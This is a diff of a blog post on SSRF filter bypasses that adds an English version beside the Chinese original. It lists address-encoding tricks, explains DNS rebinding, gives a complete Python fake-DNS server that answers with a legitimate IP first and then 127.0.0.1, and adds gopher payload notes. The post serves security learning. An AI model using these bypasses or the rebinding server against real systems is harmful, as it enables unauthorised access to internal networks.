@@ -99,18 +99,19 @@
 
 
 
-  <meta name="description" content="SSRF中的Bypass主要记录一下SSRF漏洞利用过程中的绕过手段。 在ssrf链接提交的地方屏蔽了内网地址127.0.0.1可以使用其他的表达方式绕过，等价的绕过方法有  127.0.0.1.xip.io   xip.io将类似site.10.0.0.1.xio.io这样的域名解析成10.0.0.1   [::]代替127.0.0.1  十进制的ip地址，同理2进制16进制  使用@符号 如果">
+  <meta name="description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Bypass in SSRFIn the place wh">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSRF中的Bypass">
+<meta property="og:title" content="SSRF Bypass&#x2F;SSRF中的Bypass">
 <meta property="og:url" content="http://ama666.cn/2021/02/09/SSRF中的Bypass/index.html">
 <meta property="og:site_name" content="ama666">
-<meta property="og:description" content="SSRF中的Bypass主要记录一下SSRF漏洞利用过程中的绕过手段。 在ssrf链接提交的地方屏蔽了内网地址127.0.0.1可以使用其他的表达方式绕过，等价的绕过方法有  127.0.0.1.xip.io   xip.io将类似site.10.0.0.1.xio.io这样的域名解析成10.0.0.1   [::]代替127.0.0.1  十进制的ip地址，同理2进制16进制  使用@符号 如果">
+<meta property="og:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Bypass in SSRFIn the place wh">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210209173206.png">
-<meta property="og:updated_time" content="2021-02-10T20:15:37.813Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210209173206.png">
+<meta property="og:updated_time" content="2021-10-23T02:42:25.791Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SSRF中的Bypass">
-<meta name="twitter:description" content="SSRF中的Bypass主要记录一下SSRF漏洞利用过程中的绕过手段。 在ssrf链接提交的地方屏蔽了内网地址127.0.0.1可以使用其他的表达方式绕过，等价的绕过方法有  127.0.0.1.xip.io   xip.io将类似site.10.0.0.1.xio.io这样的域名解析成10.0.0.1   [::]代替127.0.0.1  十进制的ip地址，同理2进制16进制  使用@符号 如果">
+<meta name="twitter:title" content="SSRF Bypass&#x2F;SSRF中的Bypass">
+<meta name="twitter:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Bypass in SSRFIn the place wh">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210209173206.png">
 
 
@@ -129,7 +130,7 @@
   };
 </script>
 
-  <title>SSRF中的Bypass | ama666</title>
+  <title>SSRF Bypass/SSRF中的Bypass | ama666</title>
   
 
 
@@ -383,7 +384,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SSRF中的Bypass
+          <h1 class="post-title" itemprop="name headline">SSRF Bypass/SSRF中的Bypass
 
               
             
@@ -426,7 +427,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2021-02-11 04:15:37" itemprop="dateModified" datetime="2021-02-11T04:15:37+08:00">2021-02-11</time>
+                <time title="修改时间：2021-10-23 10:42:25" itemprop="dateModified" datetime="2021-10-23T10:42:25+08:00">2021-10-23</time>
               
             
           </span>
@@ -467,7 +468,54 @@
       
 
       
-        <h1 id="SSRF中的Bypass"><a href="#SSRF中的Bypass" class="headerlink" title="SSRF中的Bypass"></a>SSRF中的Bypass</h1><p>主要记录一下SSRF漏洞利用过程中的绕过手段。</p>
+        <p>This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down.</p>
+<p>本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。</p>
+<h1 id="Bypass-in-SSRF"><a href="#Bypass-in-SSRF" class="headerlink" title="Bypass in SSRF"></a>Bypass in SSRF</h1><p>In the place where the ssrf link is submitted, the internal network address <code>127.0.0.1</code> can be bypassed using other expressions. The equivalent bypass methods are</p>
+<ul>
+<li>127.0.0.1.xip.io</li>
+</ul>
+<blockquote>
+<p>xip.io resolves domain names like site <code>10.0.0.1.xio.io</code> to 10.0.0.1</p>
+</blockquote>
+<ul>
+<li><p>[::] instead of 127.0.0.1</p>
+</li>
+<li><p>Decimal ip address, the same as binary hexadecimal</p>
+</li>
+<li><p>Use the <code>@</code> symbol</p>
+<p>If the server uses PHP or Go to parse the URL, the function used should be <code>parse_url</code>. The analysis of this function for host is based on the <code>@</code> symbol.</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210209173206.png" alt></p>
+<h3 id="DNS-Rebinding-Attack"><a href="#DNS-Rebinding-Attack" class="headerlink" title="DNS Rebinding Attack"></a>DNS Rebinding Attack</h3><p>Quote from <a href="http://blog.leanote.com/post/snowming/e2c24cf057a4" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/e2c24cf057a4</a></p>
+<blockquote>
+<ol>
+<li>Get the entered URL and extract host from the URL</li>
+<li>Perform DNS resolution on the host and get the resolved IP</li>
+<li>Check whether the IP is legal, such as whether it is a private IP, etc.</li>
+<li>If the IP detection is legal, then enter the curl stage to send packets</li>
+</ol>
+<p>Observe that in this process, a total of two DNS resolutions are performed: the first time is to perform DNS resolution on the host of the URL, and the second time is to resolve when using CURL to send packages. There is a time difference between the two DNS resolutions, and we can use this time difference to bypass.</p>
+<p>The mechanism in DNS corresponding to the event difference is <code>TTL</code>. TTL represents the longest time that the cache of the binding relationship between the domain name and IP in the DNS can survive in the DNS. That is, after requesting the relationship between the domain name and the iP, the requesting party will cache the relationship, and the cache retention time is the TTL. The cache will be deleted after invalidation. At this time, if the IP specified by the domain name is accessed again, the matching relationship and cache will be re-established.</p>
+<p>In the above process, if we can change the IP corresponding to the URL during the second DNS resolution, then after the TTL, after the cache expires, if we revisit the URL, we can get the changed IP. If we set the first parsed IP as a legal IP, we can bypass the host legitimacy check; set the second parsed IP as the intranet IP to achieve the purpose of SSRF access to the intranet.</p>
+<p>In this process, for the browser, the entire process is accessed by the same domain name, so it is considered safe. This will lead to a bypass.</p>
+<p>So to summarize:</p>
+<p>The principle of DNS rebinding attack is to use the short interval between the server to resolve the same domain name twice and change the ip behind the domain name to achieve the purpose of breaking the same-origin policy or performing ssrf through waf.</p>
+</blockquote>
+<p>DNS server</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># Randomly an IP, just bypass the check</span></span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+
+<p>Enter the address of this fake DNS server at the SSRF vulnerability point. When the first request was made, the fake DNS server returned a legal IP address, and the victim website passed the verification and started to make the curl request. At this time, what the fake DNS server returns is the intranet address, and the attack is realized.</p>
+<h2 id="gopher-protocol-notes"><a href="#gopher-protocol-notes" class="headerlink" title="gopher protocol notes"></a>gopher protocol notes</h2><p>Update the precautions when writing gopher</p>
+<ul>
+<li><p>The format of the gopher protocol is <strong>gopher://IP:port/_{TCP/IP data stream}</strong>. Don’t forget the <code>_</code> in front of the protocol.</p>
+</li>
+<li><p>%0A after URL encoding should be replaced with %0D%0A, which means line break</p>
+</li>
+<li><p>Content-Length must be correct</p>
+</li>
+</ul>
+<h1 id="SSRF中的Bypass"><a href="#SSRF中的Bypass" class="headerlink" title="SSRF中的Bypass"></a>SSRF中的Bypass</h1><p>主要记录一下SSRF漏洞利用过程中的绕过手段。</p>
 <p>在ssrf链接提交的地方屏蔽了内网地址<code>127.0.0.1</code>可以使用其他的表达方式绕过，等价的绕过方法有</p>
 <ul>
 <li>127.0.0.1.xip.io</li>
@@ -485,7 +533,7 @@
 <p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210209173206.png" alt></p>
 </li>
 </ul>
-<h3 id="DNS-Rebinding-Attack"><a href="#DNS-Rebinding-Attack" class="headerlink" title="DNS Rebinding Attack"></a>DNS Rebinding Attack</h3><p>引用<a href="http://blog.leanote.com/post/snowming/e2c24cf057a4" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/e2c24cf057a4</a></p>
+<h3 id="DNS-Rebinding-Attack-1"><a href="#DNS-Rebinding-Attack-1" class="headerlink" title="DNS Rebinding Attack"></a>DNS Rebinding Attack</h3><p>引用<a href="http://blog.leanote.com/post/snowming/e2c24cf057a4" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/e2c24cf057a4</a></p>
 <blockquote>
 <ol>
 <li>获取到输入的URL，从该URL中提取host</li>
@@ -547,7 +595,7 @@
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="http://ama666.cn/2021/02/09/SSRF中的Bypass/" title="SSRF中的Bypass">http://ama666.cn/2021/02/09/SSRF中的Bypass/</a>
+    <a href="http://ama666.cn/2021/02/09/SSRF中的Bypass/" title="SSRF Bypass/SSRF中的Bypass">http://ama666.cn/2021/02/09/SSRF中的Bypass/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -577,8 +625,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2021/02/12/权限维持初探/" rel="prev" title="权限维持初探">
-                权限维持初探 <i class="fa fa-chevron-right"></i>
+              <a href="/2021/02/12/权限维持初探/" rel="prev" title="Privilege maintenance/权限维持初探">
+                Privilege maintenance/权限维持初探 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -788,7 +836,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF中的Bypass"><span class="nav-number">1.</span> <span class="nav-text">SSRF中的Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Rebinding-Attack"><span class="nav-number">1.0.1.</span> <span class="nav-text">DNS Rebinding Attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher协议注意事项"><span class="nav-number">1.1.</span> <span class="nav-text">gopher协议注意事项</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bypass-in-SSRF"><span class="nav-number">1.</span> <span class="nav-text">Bypass in SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Rebinding-Attack"><span class="nav-number">1.0.1.</span> <span class="nav-text">DNS Rebinding Attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher-protocol-notes"><span class="nav-number">1.1.</span> <span class="nav-text">gopher protocol notes</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF中的Bypass"><span class="nav-number">2.</span> <span class="nav-text">SSRF中的Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Rebinding-Attack-1"><span class="nav-number">2.0.1.</span> <span class="nav-text">DNS Rebinding Attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher协议注意事项"><span class="nav-number">2.1.</span> <span class="nav-text">gopher协议注意事项</span></a></li></div>
             
 
           </div>
